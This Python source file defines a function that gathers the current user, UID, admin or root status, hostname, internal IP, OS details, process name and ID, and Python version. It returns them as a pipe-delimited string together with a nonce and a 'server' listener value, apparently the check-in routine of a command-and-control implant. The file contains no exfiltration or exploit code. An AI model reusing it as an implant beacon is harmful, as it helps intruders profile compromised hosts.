import platform
if platform.python_implementation() == 'IronPython':
    from System.Diagnostics import Process
    from System import Environment
    from System.Security.Principal import WindowsIdentity, WindowsPrincipal, WindowsBuiltInRole
else:
    import pwd
import os
import sys
import socket
import subprocess

def get_sysinfo(nonce='00000000'):
    # NOTE: requires global variable "server" to be set

    # nonce | listener | domainname | username | hostname | internal_ip | os_details | os_details | high_integrity | process_name | process_id | language | language_version
    __FAILED_FUNCTION = '[FAILED QUERY]'

    try:
        if platform.python_implementation() == 'IronPython':
            username =  WindowsIdentity.GetCurrent().User.ToString()
        else:
            username = pwd.getpwuid(os.getuid())[0].strip("\\")
    except Exception as e:
        username = __FAILED_FUNCTION
    try:
        if platform.python_implementation() == 'IronPython':
            uid =  WindowsIdentity.GetCurrent().User.ToString()
        else:
            uid = os.popen('id -u').read().strip()
    except Exception as e:
        uid = __FAILED_FUNCTION
    try:
        if platform.python_implementation() == 'IronPython':
            highIntegrity = WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator)
        else:
            highIntegrity = "True" if (uid == "0") else False
    except Exception as e:
        highIntegrity = __FAILED_FUNCTION
    try:
       if platform.python_implementation() != 'IronPython':
           osDetails = os.uname()
    except Exception as e:
        osDetails = __FAILED_FUNCTION
    try:
        if platform.python_implementation() == 'IronPython':
            hostname = Environment.MachineName
        else:
            hostname = osDetails[1]
    except Exception as e:
        hostname = __FAILED_FUNCTION
    try:
        internalIP = socket.gethostbyname(socket.gethostname())
    except Exception as e:
        try:
            internalIP = os.popen("ifconfig|grep inet|grep inet6 -v|grep -v 127.0.0.1|cut -d' ' -f2").read()
        except Exception as e1:
            internalIP = __FAILED_FUNCTION
    try:
        if platform.python_implementation() == 'IronPython':
            osDetails = Environment.OSVersion.ToString()
        else:
            osDetails = ",".join(osDetails)
    except Exception as e:
        osDetails = __FAILED_FUNCTION
    try:
        if platform.python_implementation() == 'IronPython':
            processID = Process.GetCurrentProcess().Id
        else:
            processID = os.getpid()
    except Exception as e:
        processID = __FAILED_FUNCTION
    try:
        temp = sys.version_info
        pyVersion = "%s.%s" % (temp[0], temp[1])
    except Exception as e:
        pyVersion = __FAILED_FUNCTION

    language = 'python'
    if platform.python_implementation() == 'IronPython':
        processName = Process.GetCurrentProcess().ToString()
    else:
        cmd = 'ps %s' % (os.getpid())
        ps = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        out, err = ps.communicate()
        parts = out.split("\n")
        if len(parts) > 2:
            processName = " ".join(parts[1].split()[4:])
        else:
            processName = 'python'

    return "%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s|%s" % (nonce, server, '', username, hostname, internalIP, osDetails, highIntegrity, processName, processID, language, pyVersion)
